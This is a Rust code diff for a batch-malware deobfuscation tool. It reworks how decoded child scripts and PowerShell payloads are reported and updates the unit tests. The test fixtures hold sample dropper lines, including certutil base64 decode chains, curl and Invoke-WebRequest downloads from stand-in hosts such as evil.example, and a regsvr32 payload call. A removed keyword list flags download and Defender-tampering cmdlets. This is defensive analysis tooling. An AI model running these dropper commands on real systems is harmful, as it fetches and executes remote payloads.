@@ -552,7 +552,7 @@ mod lex_type_tests {
     use crate::lex::{PercentTildeFlags, Token, VarOp};
 
     #[test]
-    #[allow(clippy::expect_used)]
+    #[expect(clippy::expect_used, reason = "static regex construction")]
     fn percent_tilde_flags_parse() {
         let f = PercentTildeFlags::parse("dpnx").expect("parse");
         assert!(f.d && f.p && f.n && f.x);
@@ -879,12 +879,39 @@ mod analyze_tests {
     }
 
     #[test]
+    fn echo_on_off_state_changes_are_reported_without_hiding_commands() {
+        let report = analyze(
+            b"@echo off\r\necho hidden\r\necho on\r\necho visible\r\n",
+            &Config::default(),
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::EchoStateChange { enabled: false })),
+            "echo off state change missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report
+                .traits
+                .iter()
+                .any(|t| matches!(t, Trait::EchoStateChange { enabled: true })),
+            "echo on state change missing: {:?}",
+            report.traits
+        );
+        assert!(
+            report.deobfuscated.contains("echo hidden")
+                && report.deobfuscated.contains("echo visible"),
+            "deob output should remain an analyst-visible reconstructed script: {:?}",
+            report.deobfuscated
+        );
+    }
+
+    #[test]
     fn extracted_payload_kind_helpers_match_mixed_case_markers() {
         assert!(super::looks_like_extracted_powershell(
             "InVoKe-WebReQuEsT -UrI https://hidden.example/p"
-        ));
-        assert!(super::looks_like_extracted_cmd_unc(
-            "ReGsVr32 /s /u C:\\Temp\\payload.dll"
         ));
         assert!(!super::looks_like_extracted_powershell("echo hello"));
     }
@@ -1656,15 +1683,13 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
     }
 
     #[test]
-    fn certutil_decode_payload_deob_surfaced_in_parent_output() {
+    fn certutil_decode_payload_keeps_child_script_out_of_parent_deob() {
         // Contract_Project_Agreement (d29d…) family: an echo-block
         // accumulates a base64 blob, certutil decodes it to a .bat,
         // and `call` runs it. The decoded payload contains the actual
         // powershell `Invoke-WebRequest -Uri 'URL'` line. Without
-        // appending the recursive deob to the parent's `out`, analysts
-        // only see the certutil call and base64 — not the reconstructed
-        // PS command. User feedback: "command line reconstruction is
-        // just as important" as URL extraction.
+        // The decoded payload contains the command we need to analyze, but
+        // it must not be spliced into the parent deobfuscated batch buffer.
         let script = b"@echo off\r\n\
             set _t=C:\\Temp\\stage.b64\r\n\
             set _b=C:\\Temp\\stage.bat\r\n\
@@ -1675,24 +1700,20 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
             call \"%_b%\"\r\n";
         let report = analyze(script, &AnalyzeConfig::default());
         assert!(
-            report
+            !report
                 .deobfuscated
                 .contains("==== batdeob: decoded child script"),
-            "decoded child script banner missing: {:?}",
+            "decoded child script banner polluted parent deob: {:?}",
             report.deobfuscated
         );
         assert!(
-            report.deobfuscated.contains("powershell"),
-            "decoded PS line not surfaced in parent deob: {:?}",
-            report.deobfuscated
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, .. } if src == "http://evil.example/p"
+            )),
+            "decoded child script downloader was not recursively analyzed: {:?}",
+            report.traits
         );
-        // Banner should appear exactly once even though the recursion
-        // walks the modified_filesystem at multiple depths.
-        let n = report
-            .deobfuscated
-            .matches("==== batdeob: decoded child script")
-            .count();
-        assert_eq!(n, 1, "child-script banner duplicated: count={n}");
     }
 
     #[test]
@@ -1716,9 +1737,19 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
             .traits
             .iter()
             .any(|t| matches!(t, Trait::Download { src, .. } if src.contains("api.ipify.org")));
+        let has_extracted_layer = report
+            .extracted_ps1_normalized
+            .iter()
+            .any(|payload| payload.contains("api.ipify.org"));
         assert!(
-            has_url || report.deobfuscated.contains("api.ipify.org"),
-            "self-source certutil decode did not surface inner URL: {:?}",
+            has_url || has_extracted_layer,
+            "self-source certutil decode did not retain inner command: traits={:?}, extracted={:?}",
+            report.traits,
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            !report.deobfuscated.contains("api.ipify.org"),
+            "decoded child command polluted parent deob: {:?}",
             report.deobfuscated
         );
     }
@@ -1748,8 +1779,16 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
         );
         let report = analyze(outer.as_bytes(), &AnalyzeConfig::default());
         assert!(
-            report.deobfuscated.contains("api.ipify.org"),
-            "nested certutil chain did not surface deepest payload: {:?}",
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|payload| payload.contains("api.ipify.org")),
+            "nested certutil chain did not retain deepest payload: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            !report.deobfuscated.contains("api.ipify.org"),
+            "nested certutil chain polluted parent deob: {:?}",
             report.deobfuscated
         );
         assert!(
@@ -1760,7 +1799,7 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
     }
 
     #[test]
-    fn extracted_powershell_payload_surfaced_with_banner() {
+    fn extracted_powershell_payload_stays_out_of_parent_deob() {
         // SOSTENER family: a CMD bat assembles a base64-encoded PS body
         // (`$ddsdfgo = '<b64>'; iex $oWfdfjfdsuxd`). The PS scanner
         // decodes the base64 to extract URLs, but without surfacing the
@@ -1778,16 +1817,29 @@ powershell -Command "& { (New-Object System.Net.WebClient).DownloadFile('%zipUrl
             encoded
         );
         let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
-        // The decoded PS body should be visible in the deob OR the URL
-        // should be extracted directly.
+        // The decoded PS body should be analyzed and kept in extracted PS
+        // buffers, not appended back into the batch deobfuscated output.
         let has_url = report
             .traits
             .iter()
             .any(|t| matches!(t, Trait::Download { src, .. } if src.contains("hidden.example")));
-        let has_inline = report.deobfuscated.contains("hidden.example");
         assert!(
-            has_url || has_inline,
-            "PS payload URL neither extracted nor inline: {:?}",
+            has_url,
+            "PS payload URL was not extracted: traits={:?}, deob={:?}",
+            report.traits, report.deobfuscated
+        );
+        assert!(
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|payload| payload.contains("hidden.example")),
+            "decoded PS payload missing from extracted buffers: {:?}",
+            report.extracted_ps1_normalized
+        );
+        assert!(
+            !report.deobfuscated.contains("==== batdeob: extracted")
+                && !report.deobfuscated.contains("hidden.example"),
+            "extracted PS payload polluted parent deob: {:?}",
             report.deobfuscated
         );
     }
@@ -5344,6 +5396,25 @@ mod positional_tests {
     }
 
     #[test]
+    fn recursive_variable_expansion_depth_cap_emits_trait() {
+        let mut env = Environment::new(&Config::default());
+        env.seed("A", "%A%");
+
+        let normalized = normalize_to_string(&lex("%A%"), &mut env);
+
+        assert_eq!(normalized, "%A%");
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                crate::Trait::ReExpansionDepthCapped { variable, max_depth }
+                    if variable == "A" && *max_depth == 32
+            )),
+            "missing re-expansion depth cap trait: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn percent_tilde_zero_renders_synthetic_path() {
         let mut env = Environment::new(&Config::default());
         let out = normalize_to_string(&lex("%~0"), &mut env);
@@ -8385,7 +8456,7 @@ fn analyze_inner(
         deob_scan::scan_copied_powershell_invocations(&out, &mut env);
         env.all_extracted_ps1
             .extend(std::mem::take(&mut env.exec_ps1));
-        analyze_extracted_payloads(&mut env, &mut out, 1);
+        analyze_extracted_payloads(&mut env, 1);
         ps1_scan::extract_self_embedded_ps1(&mut env, &out);
         ps1_scan::scan_ps1_payloads(&mut env);
         out = summarize_self_tail_base64_payloads(&out, &mut env);
@@ -8494,93 +8565,27 @@ fn analyze_inner(
         }
         aes_chain::extract_from_chain(input, ps, &mut env);
     }
-    // Surface decoded/extracted PowerShell payloads in the deob with a
-    // banner so analysts can read the reconstructed PS body — critical
-    // for set-fragment-assembled `$ddsdfgo = '<b64>'; iex $x` chains
-    // (SOSTENER family) where the host URL only appears inside the
-    // base64-decoded body, never as plaintext in the bat. User feedback:
-    // "command lines are just as important". We dedupe by checking if
-    // the normalized payload's first non-trivial line is already present
-    // in `out` — avoids re-emitting plain inline `powershell -c "…"`
-    // commands the lex/normalize already rendered.
-    let mut emitted_ps_keys: std::collections::HashSet<String> = std::collections::HashSet::new();
+    // Keep extracted layers out of the main deobfuscated batch buffer, but
+    // still scan their normalized text directly for IOCs that are only visible
+    // after peeling the layer.
+    let mut scanned_ps_keys: std::collections::HashSet<String> = std::collections::HashSet::new();
     for ps in &extracted_ps1_normalized {
         let trimmed = ps.trim();
         if trimmed.is_empty() {
             continue;
         }
-        // Build a stable dedupe key from the first 120 chars of the
-        // first non-empty line (avoids `$var = 'X'; iex` vs `$var='X';iex`
-        // mismatches but still catches identical payloads).
         let first_line = snippet_prefix(
             trimmed.lines().find(|l| !l.trim().is_empty()).unwrap_or(""),
             120,
         );
-        if first_line.is_empty() || !emitted_ps_keys.insert(first_line.clone()) {
+        if first_line.is_empty() || !scanned_ps_keys.insert(first_line) {
             continue;
         }
-        // Skip if a meaningful slice of the payload already shows in the
-        // deob — `Convert::FromBase64String('SGVsbG8=')` style invocations
-        // are already rendered by the regular dispatch path.
-        let sample = snippet_prefix(&first_line, 60);
-        if sample.len() >= 16 && out.contains(&sample) {
-            continue;
-        }
-        // Detect the language of the extracted payload so the banner
-        // accurately reflects what the analyst is reading. The
-        // all_extracted_ps1 vec contains anything that the dispatch path
-        // routed through the powershell handler OR was reconstructed via
-        // set-fragment / WebDAV-UNC patterns — these can be CMD net-use
-        // + rundll32 / regsvr32 chains, not actual PS.
-        let kind = if looks_like_extracted_powershell(trimmed)
-            || trimmed.contains("[System.")
-            || trimmed.contains("[Reflection.")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "powershell")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "iex ")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "iex(")
-            || trimmed.contains("-Command")
-            // Common PS cmdlet prefixes (Verb-Noun pattern)
-            || crate::util::contains_ascii_case_insensitive(trimmed, "new-object")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "start-process")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "get-content")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "get-process")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "set-content")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "write-host")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "add-mppreference")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "set-mppreference")
-            || crate::util::contains_ascii_case_insensitive(trimmed, ".downloadfile(")
-            || crate::util::contains_ascii_case_insensitive(trimmed, ".downloadstring(")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "compress-archive")
-            || crate::util::contains_ascii_case_insensitive(trimmed, "convertfrom-base64")
-            || crate::util::contains_ascii_case_insensitive(trimmed, ".webclient")
-        {
-            "PowerShell"
-        } else if looks_like_extracted_cmd_unc(trimmed) {
-            "CMD/UNC-C2"
-        } else if trimmed.contains("CreateObject(") || trimmed.contains("WScript.") {
-            "VBS/JScript"
-        } else {
-            "child"
-        };
-        out.push_str(&format!(
-            "\r\n::==== batdeob: extracted {kind} payload ====\r\n"
-        ));
-        out.push_str(ps.trim_end());
-        if !ps.ends_with('\n') {
-            out.push_str("\r\n");
-        }
-        out.push_str(&format!("::==== end extracted {kind} payload ====\r\n"));
+        deob_scan::scan_deob_text(trimmed, &mut env);
     }
-    // Run targeted scans on the FINAL `out` so detectors that live in
-    // scan_deob_text but are gated on banner-only text (PS payloads
-    // surfaced after the initial scan_deob_text pass) still fire.
-    // Currently: in-memory .NET assembly load detection — common in
-    // the SOSTENER/banglabillboard family whose Reflection.Assembly]::Load
-    // call is inside the base64-decoded PS body that didn't exist when
-    // the first scan_deob_text ran.
     collect_ps1_self_tail_reversed_gzip_pe(input, &extracted_ps1_normalized, &mut env);
     deob_scan::scan_deob_text(&out, &mut env);
-    // Re-run dedup since the post-banner scan may have emitted dupes.
+    // Re-run dedup since direct extracted-layer scans may have emitted dupes.
     let max_per_kind = cfg.max_traits_per_kind;
     dedup_traits(&mut env.traits, max_per_kind);
     collect_decoded_pe_artifacts(&mut env);
@@ -8606,12 +8611,6 @@ fn analyze_inner(
 
 fn looks_like_extracted_powershell(trimmed: &str) -> bool {
     trimmed.starts_with('$') || crate::util::contains_ascii_case_insensitive(trimmed, "invoke-")
-}
-
-fn looks_like_extracted_cmd_unc(trimmed: &str) -> bool {
-    starts_with_ascii_case_insensitive(trimmed, "net use ")
-        || crate::util::contains_ascii_case_insensitive(trimmed, "rundll32 ")
-        || crate::util::contains_ascii_case_insensitive(trimmed, "regsvr32 ")
 }
 
 fn summarize_multiline_base64_pe_carrier_blocks(text: String, env: &mut Environment) -> String {
@@ -9838,7 +9837,7 @@ fn block_set_p_prompt_payload(body: &str) -> Option<String> {
     Some(prompt.to_string())
 }
 
-fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u32) {
+fn analyze_extracted_payloads(env: &mut Environment, depth: u32) {
     use std::collections::HashSet;
     use std::hash::{Hash, Hasher};
 
@@ -9849,7 +9848,7 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
         hasher.finish()
     }
 
-    fn walk(env: &mut Environment, out: &mut String, depth: u32, seen: &mut HashSet<u64>) {
+    fn walk(env: &mut Environment, depth: u32, seen: &mut HashSet<u64>) {
         if depth >= 12 {
             return;
         }
@@ -9897,24 +9896,6 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
                 drive(&content, env, &mut child_out);
                 env.input_bytes = prev_input_bytes;
             }
-            // Surface the recursive deob in the main output with a banner so
-            // analysts can read the reconstructed child-script commands —
-            // critical for certutil-decode + call droppers (Contract_Project_-
-            // Agreement family) where the actual `powershell -Command "…"`
-            // line lives only in the decoded payload. Without this the parent
-            // deob stops at `certutil -decode …` and never reveals the
-            // downstream invocation, even though URLs surface as traits.
-            if !child_out.trim().is_empty() {
-                out.push_str("\r\n");
-                out.push_str(&format!(
-                    "::==== batdeob: decoded child script ({dst}) ====\r\n"
-                ));
-                out.push_str(&child_out);
-                if !child_out.ends_with('\n') {
-                    out.push_str("\r\n");
-                }
-                out.push_str("::==== end decoded child script ====\r\n");
-            }
             let decoded_text = String::from_utf8_lossy(&content).into_owned();
             let self_iex = {
                 (crate::util::contains_ascii_case_insensitive(&decoded_text, "readalltext")
@@ -9940,11 +9921,11 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
         // files appeared. This keeps sibling ordering and depth reporting
         // independent of hash-map iteration order.
         if processed_any {
-            walk(env, out, depth + 1, seen);
+            walk(env, depth + 1, seen);
         }
     }
 
-    walk(env, out, depth, &mut HashSet::new());
+    walk(env, depth, &mut HashSet::new());
 }
 
 /// Heuristic: does the input contain any `!IDENT[…]!` reference (the
@@ -9956,7 +9937,7 @@ fn analyze_extracted_payloads(env: &mut Environment, out: &mut String, depth: u3
 fn has_bang_var_reference(input: &[u8]) -> bool {
     use once_cell::sync::Lazy;
     use regex::bytes::Regex;
-    #[allow(clippy::expect_used)]
+    #[expect(clippy::expect_used, reason = "static regex construction")]
     static BANG_RE: Lazy<Regex> = Lazy::new(|| {
         // `!IDENT!`  or  `!IDENT:…!`  (the `:` form is substring/substitution
         // and is just as much a delayed-expansion construct as plain `!X!`).
@@ -9971,7 +9952,7 @@ fn has_bang_var_reference(input: &[u8]) -> bool {
 fn has_disable_delayed_expansion(input: &[u8]) -> bool {
     use once_cell::sync::Lazy;
     use regex::bytes::Regex;
-    #[allow(clippy::expect_used)]
+    #[expect(clippy::expect_used, reason = "static regex construction")]
     static DIS_RE: Lazy<Regex> =
         Lazy::new(|| Regex::new(r"(?i)setlocal\s+disabledelayedexpansion").expect("dis re"));
     DIS_RE.is_match(input)
@@ -22586,9 +22567,12 @@ Invoke-Expression $cmd"#,
             report.deobfuscated
         );
         assert!(
-            report.deobfuscated.contains(decoded),
-            "literal index extractor dummy-arg output was not retained:\n{}",
-            report.deobfuscated
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|payload| payload.contains(decoded)),
+            "literal index extractor dummy-arg output was not retained in extracted buffers: {:?}",
+            report.extracted_ps1_normalized
         );
     }
 
@@ -23144,9 +23128,12 @@ Piece 0 'noise|{decoded}|tail' '|' 1"#
             report.deobfuscated
         );
         assert!(
-            report.deobfuscated.contains(decoded),
-            "literal reordered split-index extractor output was not retained:\n{}",
-            report.deobfuscated
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|payload| payload.contains(decoded)),
+            "literal reordered split-index extractor output was not retained in extracted buffers: {:?}",
+            report.extracted_ps1_normalized
         );
     }
 
@@ -24591,9 +24578,9 @@ Lower 'INVOKE-WEBREQUEST -URI HTTPS://PS-LOWER-EXTRACTOR.EXAMPLE/STAGE.PS1'"#;
         let report = analyze(script.as_bytes(), &Config::default());
 
         assert!(
-            report
-                .deobfuscated
-                .contains("https://ps-ireplace-ci.example/stage"),
+            report.traits.iter().any(|t| {
+                matches!(t, Trait::Download { src, .. } if src == "https://ps-ireplace-ci.example/stage")
+            }),
             "PowerShell -ireplace should normalize case-insensitive replacement: {:?}\n{}",
             report.traits,
             report.deobfuscated
@@ -26198,9 +26185,12 @@ if ($finalScript -ne $null) {{
             report.deobfuscated
         );
         assert!(
-            report.deobfuscated.contains(url),
-            "decoded inline xor/base64 payload was not surfaced in deobfuscated output:\n{}",
-            report.deobfuscated
+            report
+                .extracted_ps1_normalized
+                .iter()
+                .any(|payload| payload.contains(url)),
+            "decoded inline xor/base64 payload was not retained in extracted buffers: {:?}",
+            report.extracted_ps1_normalized
         );
     }
 
@@ -26720,7 +26710,7 @@ mod recursive_payload_tests {
     }
 
     #[test]
-    fn decoded_child_scripts_are_reported_in_stable_path_order() {
+    fn decoded_child_scripts_emit_stable_recursive_traits_without_deob_banners() {
         let a_bat = "curl -o a.exe http://a.example/p\r\n";
         let b_bat = "curl -o z.exe http://z.example/p\r\n";
         let a_b64 = base64::engine::general_purpose::STANDARD.encode(a_bat.as_bytes());
@@ -26733,17 +26723,9 @@ mod recursive_payload_tests {
         );
 
         let report = analyze(script.as_bytes(), &Config::default());
-        let a_banner = report
-            .deobfuscated
-            .find("decoded child script (a-child.bat)")
-            .expect("missing a-child decoded banner");
-        let z_banner = report
-            .deobfuscated
-            .find("decoded child script (z-child.bat)")
-            .expect("missing z-child decoded banner");
         assert!(
-            a_banner < z_banner,
-            "decoded child banners should be stable path order:\n{}",
+            !report.deobfuscated.contains("decoded child script"),
+            "decoded child banners should not pollute parent deob:\n{}",
             report.deobfuscated
         );
 
